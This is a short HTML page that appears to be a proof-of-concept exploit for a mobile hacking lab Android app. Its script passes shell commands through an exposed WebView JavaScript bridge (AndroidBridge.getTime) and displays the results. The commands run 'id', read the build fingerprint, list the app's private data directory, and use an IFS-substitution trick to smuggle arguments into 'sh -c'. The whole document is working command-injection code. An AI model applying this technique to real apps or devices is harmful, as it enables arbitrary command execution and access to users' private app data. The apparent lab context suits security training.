<!DOCTYPE html>
<html><body>
<pre id="out">running...</pre>
<script>
  const cmds = [
    "id",
    "getprop ro.build.fingerprint",
    "ls /data/data/com.mobilehackinglab.guessme",
    "sh -c id${IFS}2>&1"
  ];
  document.getElementById('out').innerText =
    cmds.map(c => "$ " + c + "\n" + AndroidBridge.getTime(c)).join("\n\n");
</script>
</body></html>
